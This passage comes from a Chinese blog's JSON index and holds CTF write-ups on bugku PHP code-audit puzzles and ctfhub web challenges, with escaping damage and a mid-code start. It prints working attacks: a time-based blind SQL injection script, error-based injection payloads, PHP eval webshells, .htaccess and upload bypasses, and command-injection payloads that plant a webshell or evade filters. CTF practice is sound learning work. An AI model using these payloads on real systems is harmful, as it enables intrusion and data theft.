ord(\u0026#39;9\u0026#39;); //ord — 返回字符的 ASCII 码值 \t$number = \u0026#39;3735929054\u0026#39;; // Check all the input characters! \tfor ($i = 0; $i \u0026lt; strlen($number); $i++){ // Disallow all the digits! \t$digit = ord($temp{$i}); if ( ($digit \u0026gt;= $one) \u0026amp;\u0026amp; ($digit \u0026lt;= $nine) ){ // Aha, digit not allowed! \treturn \u0026#34;flase\u0026#34;; } } if($number == $temp) return $flag; } $temp = $_GET[\u0026#39;password\u0026#39;]; echo noother_says_correct($temp);   变量覆盖(平台挂掉了) ereg正则%00截断 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  \u0026lt;?php $flag = \u0026#34;xxx\u0026#34;; if (isset ($_GET[\u0026#39;password\u0026#39;])){ if (ereg (\u0026#34;^[a-zA-Z0-9]+$\u0026#34;, $_GET[\u0026#39;password\u0026#39;]) === FALSE){ echo \u0026#39;You password must be alphanumeric\u0026#39;; }else if (strlen($_GET[\u0026#39;password\u0026#39;]) \u0026lt; 8 \u0026amp;\u0026amp; $_GET[\u0026#39;password\u0026#39;] \u0026gt; 9999999){ if (strpos ($_GET[\u0026#39;password\u0026#39;], \u0026#39;-\u0026#39;) !== FALSE){ //strpos — 查找字符串首次出现的位置 \tdie(\u0026#39;Flag: \u0026#39; . $flag); }else{ echo(\u0026#39;- have not been found\u0026#39;); } }else{ echo \u0026#39;Invalid password\u0026#39;; } }   法1.php对字符串是数字的部分进行截取进行判断 还有就是 erge %00截断匹配了\n法2.数组返回 null null !== false\nstrpos数组绕过 1 2 3 4 5 6 7 8 9 10  \u0026lt;?php $flag = \u0026#34;flag\u0026#34;; if (isset ($_GET[\u0026#39;ctf\u0026#39;])) { if (@ereg (\u0026#34;^[1-9]+$\u0026#34;, $_GET[\u0026#39;ctf\u0026#39;]) === FALSE) echo \u0026#39;必须输入数字才行\u0026#39;; else if (strpos ($_GET[\u0026#39;ctf\u0026#39;], \u0026#39;#biubiubiu\u0026#39;) !== FALSE) die(\u0026#39;Flag: \u0026#39;.$flag); else echo \u0026#39;骚年，继续努力吧啊~\u0026#39;; }   跟上一题一样 没什么好解释\n数字验证正则绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  \u0026lt;?php error_reporting(0); $flag = \u0026#39;flag{test}\u0026#39;; if (\u0026#34;POST\u0026#34; == $_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;]){ $password = $_POST[\u0026#39;password\u0026#39;]; if (0 \u0026gt;= preg_match(\u0026#39;/^[[:graph:]]{12,}$/\u0026#39;, $password)){ //preg_match — 执行一个正则表达式匹配 \techo \u0026#39;flag\u0026#39;; exit; } while (TRUE){ $reg = \u0026#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/\u0026#39;; if (6 \u0026gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(\u0026#39;punct\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;lower\u0026#39;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 \tforeach ($ps as $pt){ if (preg_match(\u0026#34;/[[:$pt:]]+/\u0026#34;, $password)) $c += 1; } if ($c \u0026lt; 3) break;\t//\u0026gt;=3，必须包含四种类型三种与三种以上 \tif (\u0026#34;42\u0026#34; == $password) echo $flag; else echo \u0026#39;Wrong password\u0026#39;; exit; } }   要长度超过12字母符号数字大小写超过三种 但是实际测试符合条件的都不行 不符合条件的就直接出flag 不懂不懂。。。。。\n网上版本都是直接post空值就行 应该是哪里出了问题？题目本意应该不是这个？\n简单的waf(靶机挂了) ","description":"","id":21,"section":"posts","tags":["CTF"],"title":"bugku代码审计","uri":"https://ruokeqx.gitee.io/posts/code_auditing/"},{"content":"信息泄露 目录历遍 直接找就行。。。\nPHPINFO 进去直接 ctrl+f 搜flag就行。。。\n备份文件下载 网站源码 提示一些相关的名字\n可以写个简单的脚本爆破一下 当然也可以 dirsearch 直接扫\n1 2 3 4 5 6 7 8 9 10 11 12  import requests url = \u0026#34;http://challenge-c93f188d4781b829.sandbox.ctfhub.com:10080/\u0026#34; a = [\u0026#39;web\u0026#39;,\u0026#39;website\u0026#39;,\u0026#39;backup\u0026#39;,\u0026#39;back\u0026#39;,\u0026#39;www\u0026#39;,\u0026#39;wwwroot\u0026#39;,\u0026#39;temp\u0026#39;] b = [\u0026#39;tar\u0026#39;,\u0026#39;tar.gz\u0026#39;,\u0026#39;zip\u0026#39;,\u0026#39;rar\u0026#39;] for i in a: for j in b: pos = url + i + \u0026#39;.\u0026#39; + j r = requests.get(pos) print(i) print(j) print(r)   获得源码解压后有个 flag.txt 但是里面不是flag 还有个奇怪的 50x.html 尝试直接访问这个奇怪的 html 没用 直接访问这个 flag.txt 就出了\nbak文件 看到题目就下意识 备份文件后缀是 .bak （linux命名的习惯）\n打开网页 提示flag在 flag.php 里 加上后缀 down 下文件 flag就在里面\nvim缓存 又是考常识吧 linux下vim的缓存文件后缀是 .tmp 而且是隐藏文件 有个 . 的前缀\n把下下来的文件放 linux 读缓存就行了\n.DS_Store .DS_Store 是macos系统下的包含文件目录的文件\n下载文件并用脚本分析 然后到靶机打开这个目录就行\nGit泄露 真的不知道为什么 不管是 win 还是 linux 都没反应 重装了也不行\nGithack 不能用的问题解决了 是脚本的问题 这里感谢一下评论区的师傅\n亲测可用的 Githack链接： https://github.com/BugScanTeam/GitHack\nLog 相对简单的一题 知识点：\n git log可以查看日志 就是看看历史版本中都干了些什么 git reset \u0026ndash;hard 版本号 就可以回到指定的版本  git reset --hard xxxxxxxxxxxxxxx\rStash 做这题之前 需要知道 stash 是什么东西\n git stash是git一个很有用的命令，它的作用是把当前未提交的修改暂存起来，让仓库还原到最后一次提交的状态。常用于更新、同步代码或者保存多个修改版本等情况下。\n 个人感觉这篇百度经验写的精简明了\ngit stash\t# git stash命令会将仓库中的修改保存，建立一条stash信息，默认的说明信息是最后一次提交的节点号和提交说明。\rgit stash save #‘说明信息’与1的效果一样，说明信息是指定的内容，更加利于了解stash的内容。\rgit stash list #列出当前仓库下所有的stash条目，每一条stash用stash@{n}标识。\rgit stash pop [stash] # 将stash的内容弹出，默认弹出最上面的那条，即stash@{0}。此外还可以在pop后加stash@{n}来指定要弹出的stash条目。\rgit stash drop [stash] #丢弃stash条目，默认丢弃最上面的那条，即stash@{0}，此外还可以在drop后加stash@{n}来指定要丢弃的stash条目。\rgit stash clear #清除所有的stash条目。\rgit show stash@{n}\t#当有多条记录并且过了一段时间忘记stash内容时通过该命令可以查看stash的具体内容\rIndex ??? 这题简单地离谱。。。flag就在当前目录下 。。。我还以为是假的呢 那么为啥他是第三题。。。。\nSVN泄露 使用 dvcs-ripper 工具中的 rip-svn.pl 脚本\n脚本使用过程可能会遇到下面类似的很长的报错\n install_driver(SQLite) failed: Can’t locate DBD/SQLite.pm\n 解决方法 强烈建议开靶机前解决这个问题 不然很可能需要多花金币续费靶机\nHG泄露 还是上一个脚本库里的 rip-hg.pl\n1 2  #一定要加 -v 不然 down 不下来的 ./rip-hg.pl -v -u http://challenge-365f72206c2c35b5.sandbox.ctfhub.com:10080/.hg/   然后就是文件夹里一顿疯找 但是什么都找不到 但是很多个文件 里面都有关于 flag.txt 的\n看到这个就很清楚了 直接访问这个 flag.txt\n密码口令 弱口令 第一次开靶机真的没有爆出来 真的郁闷 密码是随机的\n默认口令 没有用户名会提醒没有用户名 筛选用户名 选择对应口令就可以\nSQL注入 SQL 整数型注入 id从3开始就没有回显 可以在3以后的数注\n注得数据库结构如下\n sqli  news  id\t//1,2,114514 data\t//ctfhub,skill,sqli   flag  flag      SQL字符型注入 数据库还是跟上一题一样 就是搜索方式 从数字变成字符 闭合一下前面的引号就可以了 本题不再赘述\n理论上来说你可以直接注 flag 表里的 flag 字段(我就是这么做的 太懒了)\nSQL报错注入 updatexml 最长显示32位数 这题不能用\n使用\n1  1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;   时间盲注 学习的话可以参考这个\n靶机续费了两次 亏死了 下面这个图里跑出来的flag是错的 QWQ 最后开第二遍跑出来了\n先手测一下 数据库 按出题人尿性都是 sqli 然后 匹配一下 s 看看 再匹配 a 对比一下\n用我蹩脚的python(我靶机续费两次的原因之一,,,,,,,QWQ) 写波脚本跑一下\n然后完善脚本把 数据表 字段和flag都跑出来 脚本如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  #写脚本水平很低 大神不要喷哈 #使用的话只要稍微改几个参数就行了 import requests import time url = \u0026#34;http://challenge-9514b2cf659c25a1.sandbox.ctfhub.com:10080/?id=\u0026#34; des = \u0026#34;\u0026#34; for k in range(0,1): print(k) for i in range(1,60): for j in \u0026#39;abcdefghijklmnopqrstuvwxyz}{0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;: # 数据库 # sql = \u0026#34;if(substr(database(),%d,1)=\u0026#39;%s\u0026#39;,sleep(1),1) #\u0026#34; %(i,j) # 数据表 # sql = \u0026#34;if(substr((select table_name from information_schema.tables where table_schema=\u0026#39;sqli\u0026#39; limit %d,1),%d,1) = \u0026#39;%s\u0026#39;,sleep(1),1)\u0026#34; %(k,i,j) # 字段 # sql = \u0026#34;if(substr((select column_name from information_schema.columns where table_name=\u0026#39;flag\u0026#39; and table_schema=\u0026#39;sqli\u0026#39;),%d,1) = \u0026#39;%s\u0026#39;,sleep(1),1)\u0026#34; %(i,j) # 字段内容 sql = \u0026#34;if(substr((select flag from sqli.flag),%d,1) = \u0026#39;%s\u0026#39;,sleep(1),1)\u0026#34; %(i,j) t1 = time.time() r = requests.get(url+sql) t2 = time.time() if(t2-t1 \u0026gt; 1): des += j print(des) break print(\u0026#34;des:\u0026#34; + des) des = \u0026#34;\u0026#34;   MySQL结构 就是普通手注就行\u0026hellip;\u0026hellip;.为啥它放这么下面\u0026hellip;\u0026hellip;.不想写了\n算了 sqlmap 跑一波吧 这么多题还没跑过 sqlmap 呢 结果 sqlmap 跑还没手注快\u0026hellip;..真实\u0026hellip;\u0026hellip;\nCookie注入 抓包cookie后面 id后有一串东西像url编码 但是解出来乱码 直接改 id=1 试试\n手注发现有两处回显 无任何绕过\n注得数据库结构\n sqli  news  id  1,2,114514   data  ctfhub,skill,sqli     nooslnmxuf  vuhgcinlvb  ctfhub{8283144bd2b701f08311ac069af61fabdf227936}\\        sqlmap也能跑出来\n python sqlmap.py -u \u0026ldquo;http://challenge-192a33ee430cafd7.sandbox.ctfhub.com:10080/\u0026quot; \u0026ndash;cookie \u0026ldquo;id=1\u0026rdquo; \u0026ndash;dbs\n UA注入 UA注入介绍\n依然手注 依然无任何绕过 依然两个回显\n注得数据库结构\n sqli  news  id  1,2,114514   data  ctfhub,skill,sqli     rnarxnqskp  ahlzriucqp  ctfhub{df17b7f5fff86cb0176e077e0231c5ce567fb3ac}        Refer注入 我觉得还是一模一样的套路 不想写了\u0026hellip;\u0026hellip;.唯一要注意的就是refer头要自己加\n ipploqowdc\nozknttspso\nctfhub{5cca896d0b05a1eb8977197827b33b57df87aacb}\n 文件上传 无验证 传个马上去\n蚁剑连上去\n找到flag\n前端验证 php改名字前端上传 抓包改回php 一样的操作连蚁剑 取flag\n.htaccess  htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能\n 简单来说就是操控服务器让他允许你做事\n百度百科链接\n.htaccess 利用方法 参考博文\n法一\n# FileMatch 参数即为文件名的正则匹配\r\u0026lt;FilesMatch \u0026quot;sniperoj\u0026quot;\u0026gt;\rSetHandler application/x-httpd-php\r\u0026lt;/FilesMatch\u0026gt;\r1  \u0026lt;?php eval($_GET[\u0026#39;c\u0026#39;]);?\u0026gt;  法二\nAddType application/x-httpd-php .jpg\r1  \u0026lt;?php @eval($_GET[\u0026#39;ma\u0026#39;]);?\u0026gt;  写个 .htaccess 文件 写个 马 后缀改 jpg(你允许的后缀) 然后上传蚁剑连一下就行了\nMIME绕过  MIME:客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。\n 简单来说就是从 http 报文判断一下你上传的文件的类型\n写个马 Content-Type 字段中的值改成 image/gif 就行了 然后连蚁剑拿flag\n文件头检查 画图软件随便弄个图 抓包最后加上马 然后改名 php 蚁剑连上就行\n00截断  00截断原理   0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。\n 00截断的限制条件  PHP\u0026lt;5.3.29，且GPC关闭\r传个普通的 temp.php 马上去抓包\n修改的地方可以有两个 1.上面地址 2.下面文件名 这里建议改上面的 原因\n我下面文件 temp.php 改成 temp.jpg 不然没法上传\n上面的地址改的是 ma.php 所以连的时候连 ma.php\n这样更容易理解吧\n双写后缀 这就不用多讲了吧 题目都告诉你怎么做了 双写后缀就行 不过这个命名稍微有点讲究 稍微注意下就行\nRCE 命令注入 可以先试一下 ping 127.0.0.1 然后 列一下目录\n 127.0.0.1 \u0026amp; ls\n 可以看到一个纯数字的 php文件 里面绝对就是flag 最后那个 ma.php 是我后来传的\n尝试cat一下那个文件 发现被屏蔽了 more tac 等命令全都被屏蔽了 那么问题来了 这题跟第二题 屏蔽cat 有什么区别\n可以任意命令执行 直接重定向个马上去 用蚁剑连就可以了\n 127.0.0.1 \u0026amp; echo \u0026ldquo;\u0026lt;?php @eval($_POST[\u0026lsquo;ma\u0026rsquo;]);\u0026rdquo; \u0026gt; ma.php\n 重定向：简单来说就是命令行的输入和输出换个地方输入或者输出 可以直接往文件输出。\n过滤cat 跟上一题完全一样 不赘述\n过滤空格 过滤空格方法\n{cat,flag.txt} cat${IFS}flag.txt\rcat$IFS$9flag.txt\rcat\u0026lt;flag.txt\rcat\u0026lt;\u0026gt;flag.txt\rkg=$'\\x20flag.txt'\u0026amp;\u0026amp;cat$kg\r(\\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)\r这道题目差点让我自闭\n1 2 3 4 5  #列一下目录 #这里\u0026amp;\u0026amp; 和 || 都可以 照理说 || 是不行的 应该用 \u0026amp;\u0026amp;  127.0.0.1||ls #cat一下 flagxxxx.php 127.0.0.1||cat\u0026lt;flagxxxx.php   然后我一直自闭在这里明明没有空格 他也正常执行了 为什么返回一个空行呢\n反复尝试了无数遍后我无奈地打开wp但是发现wp跟我一样QWQ 原地裂开更加怀疑人生\n最后靶机还有 30s 的时候(一定要看源码！！！)\n过滤目录分隔符 列一下目录\n 127.0.0.1 || ls\n 列一下 flag目录\n 127.0.0.1 || ls flag_is_here\n 只有一个 flag.php\n切换到 flag 目录再cat flag.php\n 127.0.0.1 || cd flag_is_here\u0026amp;\u0026amp;cat flag_40921853324810.php\n 过滤运算符 列目录 分号类类似于很多编程语言的分号 所以理论上你的所有 php 都可以写在一行里\n ;ls\n 然后 cat 一下flag就可以了 感觉这题比前面几题都简单一些\n综合练习 首先尝试了下把分号url编码 不过是没用的 换行符 url 编码 %0a\n要直接在地址栏输入不然 % 会被转成url编码 %25 我这里只是演示\n1  %0Als${IFS}$(printf${IFS}%22\\x66\\x6C\\x61\\x67\\x5F\\x69\\x73\\x5F\\x68\\x65\\x72\\x65%22)   这么长要一个一个转化为十六进制 然后手差点断掉。。。\n1  %0Aca%27%27t${IFS}$(printf${IFS}\u0026#34;\\x66\\x6c\\x61\\x67\\x5f\\x69\\x73\\x5f\\x68\\x65\\x72\\x65\\x2f\\x66\\x6c\\x61\\x67\\x5f\\x33\\x32\\x31\\x30\\x38\\x36\\x39\\x39\\x31\\x33\\x30\\x34\\x30\\x32\\x2e\\x70\\x68\\x70\u0026#34;)   上面的全部原理都在下面这张图中\n","description":"","id":22,"section":"posts","tags":["CTF","WP"],"title":"ctfhub writeup","uri":"https://ruokeqx.gitee.io/posts/ctfhub_wp/"}]